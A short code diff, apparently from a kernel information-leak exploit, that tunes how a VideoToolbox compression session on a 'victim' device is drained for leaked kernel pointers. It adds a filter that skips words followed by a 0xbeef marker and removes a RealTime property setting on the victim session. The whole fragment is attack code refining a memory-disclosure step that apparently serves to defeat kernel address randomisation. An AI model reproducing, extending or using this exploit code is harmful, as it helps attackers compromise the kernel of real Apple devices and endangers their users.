@@ -174,6 +174,7 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
                     size_t words = outSz / sizeof(uint64_t);
                     for (size_t w = 0; w < words && liveKPtrCount < 8; w++) {
                         uint64_t v = pageBuf[w];
+                        if (w + 1 < words && pageBuf[w + 1] == 0x000000000000beefULL) continue;
                         if (KPIsKernelPointerCandidate(v) && !KPIsKnownDiagnosticConstant(v)) {
                             BOOL dup = NO;
                             for (int k = 0; k < liveKPtrCount; k++) {
@@ -249,7 +250,6 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     }
     OSStatus pmSt = 0;
     OSStatus uSt = VTSessionSetProperty(victim, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
-    VTSessionSetProperty(victim, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
     OSStatus privNSt = 0;
     if (ntl >= 16463) {
         pmSt = VTSessionSetProperty(victim, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
